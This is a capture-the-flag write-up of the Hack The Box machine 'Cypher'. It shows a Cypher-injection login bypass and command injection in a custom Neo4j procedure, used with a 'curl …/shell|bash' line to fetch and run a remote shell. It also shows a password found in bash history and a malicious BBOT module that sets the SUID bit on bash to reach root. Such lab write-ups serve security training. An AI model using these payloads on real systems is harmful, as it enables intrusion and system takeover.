---
icon: key
---

# HTB-CYPHER

<figure><img src="../../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

1. The **Web Page** is tested for login weaknesses by inserting `'` into the username field, which triggers **traceback errors**.
2. This **information leakage** reveals that the backend is using **Neo4j queries** for authentication.
3. By crafting a malicious query, **authentication bypass** is achieved, granting **access to the dashboard**.
4. On the dashboard, **Neo4j PROCEDURES** are enumerated, revealing a **command injection** vulnerability in the `getUrlStatusCode` function.
5. Exploiting this vulnerability results in a **shell as the `neo4j` user**.
6. Separately, **directory bruteforcing** discovers `/testing`, which hosts a downloadable **JAR file**.
7. Analyzing the JAR file reveals **custom Neo4j functions** in the source code.
8. Both the **traceback info** and **JAR analysis** lead to the **same command injection** exploit, confirming access as the `neo4j` user.

**Privilege Escalation**

1. As the `neo4j` user, inspecting `.bash_history` reveals a **password for the `graphasm` user**.
2. Using this password allows access as `graphasm`.
3. Uploading and executing a **malicious BBOT module** as `graphasm` provides **root shell access**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```
# Nmap 7.95 scan initiated Tue Mar  4 17:02:13 2025 as: /usr/lib/nmap/nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt 10.129.12.135
Nmap scan report for 10.129.12.135
Host is up (0.092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  4 17:02:53 2025 -- 1 IP address (1 host up) scanned in 40.56 seconds
```

As always I start with a **nmap** scan and there’s a domain name associated with port 80 that I add to my `/etc/hosts` file.

### Execution <a href="#execution" id="execution"></a>

<figure><img src="../../../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

Reading through the **about** page the product seems to be a _revolutionary Attack Surface Management solution_ that uses **proprietary graph technology**. Following the link to the free demo redirects me to a login prompt, but there are no credentials available.

Trying some default combinations is unsuccessful but using a single apostrophe in the username results in a traceback leaking some **Python** code.

<figure><img src="../../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

After I repeat the login procedure in **BurpSuite** I can have a closer look at the traceback because the popup on the web page is only there for a moment. Apparently the database in use is [neo4j](https://github.com/neo4j/neo4j) and it seems like I can inject my input into the database query.

```python
Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
                                                            ^}
 
During handling of the above exception, another exception occurred:
 
Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
                                                            ^}
```

#### Authentication Bypass <a href="#authentication-bypass" id="authentication-bypass"></a>

From the query `MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '<USERINPUT>' return h.value as hash` I can construct a query that returns the **SHA1** hash for the password that I provide.

```python
{
	"username":"admin' OR 1=1 RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' as hash //",
	"password":"password"
}
```

Running the above query results in a successful authentication and I get access to the dashboard where I can run **neo4j** queries. Poking around there is just one user `graphasm` configured and even though I can leak the hash with `LOAD CSV` it does not crack. The query `SHOW PROCEDURES` does reveal two custom functions.

<figure><img src="../../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

As soon as I run the query `CALL custom.getUrlStatusCode('http://10.10.10.10')` I get a hit on my web server.

```python
sn0x㉿sn0x)-[~/hackthebox/CYPHER]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.10.10] from (UNKNOWN) [10.129.220.87] 55530
GET / HTTP/1.1
Host: 10.10.10.10
User-Agent: curl/8.5.0
Accept: */*
 
```

Based on the user-agent `curl` I assume that the actual call is made via a shell command and try to inject my own command in a sub-shell. I confirm that assumption by running `CALL custom.getUrlStatusCode('http://10.10.10.10/$(whoami)')` and I observe a connection to `/neo4j`.

To get a reverse shell I host a payload in `shell` and then call the custom function again. This drops me into a shell as `neo4j` in `/var/lib/neo4j`.

```
CALL custom.getUrlStatusCode('http://10.10.10.10/$(curl 10.10.10.10/shell|bash)')
```

#### Directory Bruteforce <a href="#directory-bruteforce" id="directory-bruteforce"></a>

Instead of using the authentication bypass to enumerate the database, the required information can also be found through bruteforcing directories on the target. Running **ffuf** quickly finds the folder `/testing` that has directory listing enabled and contains a JAR file called `custom-apoc-extension-1.0-SNAPSHOT.jar`

<pre class="language-python"><code class="lang-python"><strong>(sn0x㉿sn0x)-[~/hackthebox/CYPHER]
</strong>└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
       -u http://cypher.htb/FUZZ
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
 
       v2.1.0-dev
________________________________________________
 
 :: Method           : GET
 :: URL              : http://cypher.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
 
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 22ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 28ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 41ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 35ms]
</code></pre>

Downloading the **JAR** file and loading it into [jadx-gui](https://github.com/skylot/jadx) lists two custom functions. This time no guess work is involved to figure out that the input to `custom.getUrlStatusCode` is passed to a bash command.

<figure><img src="../../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

Through the login prompt I inject the call to the custom function and also get a shell as `neo4j`.

```python
{
	"username":"admin' RETURN 0 UNION CALL custom.getUrlStatusCode('http://10.10.10.10; curl http:/10.10.10.10/shell|bash') YIELD statusCode RETURN 0 //",
	"password":"password"
}
```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Shell as graphasm

Within the home directory for the `neo4j` user there’s a `.bash_history` file with a single line containing a password.

```
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```

Trying the password `cU4btyib.20xtCMCXkBmerhK` for the user `graphasm` works and I can collect the first flag.<br>

#### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>

First I check the sudo privileges for the new user and they can run `/usr/local/bin/bbot` as _anyone_ without providing a password.

```python
(sn0x㉿sn0x)-[~/hackthebox/CYPHER]
└─$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

[BBOT](https://github.com/blacklanternsecurity/bbot) is an internet scanner that can be customized with modules. Creating a _malicious_ module is kind of straightforward<sup>1</sup> and I start by creating a new directory `/tmp/modules` and add the custom location to the already present `bbot_presets.yml` configuration file in `graphasm`’s home directory.

```python
(sn0x㉿sn0x)-[~/hackthebox/CYPHER]
└─$ mkdir /tmp/modules
 
(sn0x㉿sn0x)-[~/hackthebox/CYPHER]
└─$ cat bbot_presets.yml
targets:
  - ecorp.htb
 
output_dir: /home/graphasm/bbot_scans
 
config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
 
module_dirs:
  - /tmp/modules
```

Then I place my custom module into `/tmp/modules/escalate.py`. During the `setup` method the `bash` binary is copied to the `tmp` directory and the SUID bit is applied. Then the module produces a hard fail to interrupt the scan run.

escalate.py

```python
import os
 
from bbot.modules.base import BaseModule
 
class escalate(BaseModule):
    watched_events = ["DNS_NAME"] # watch for DNS_NAME events
    produced_events = ["WHOIS"] # we produce WHOIS events
    flags = ["passive", "safe"]
    meta = {"description": "Escalate to root"}
    per_domain_only = True # only run once per domain
 
    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        os.system('cp /bin/bash /tmp/bash; chmod u+s /tmp/bash')
        return False, 'Check /tmp/bash!'
 
    async def handle_event(self, event):
        pass


```

Right after I run the `bbot` file while providing the configuration file and calling the `escalate` module directly. The execution aborts but the modified `bash` binary is now present in the `/tmp` directory and I can use it to change to `root`.

```python
(sn0x㉿sn0x)-[~/hackthebox/CYPHER]
└─$ sudo /usr/local/bin/bbot -p ./bbot_preset.yml -m escalate
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
 
www.blacklanternsecurity.com/bbot
 
[INFO] Scan with 1 modules seeded with 0 targets (0 in whitelist)
[INFO] Loaded 1/1 scan modules (escalate)
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[INFO] internal.excavate: Compiling 10 YARA rules
[INFO] internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
[INFO] Setup soft-failed for escalate: Check /tmp/bash!
[SUCC] Setup succeeded for 12/13 modules.
[SUCC] Scan ready. Press enter to execute sneaky_richard
^C
[WARN] You killed sneaky_richard
```

<figure><img src="../../../../.gitbook/assets/complete (15).gif" alt=""><figcaption></figcaption></figure>
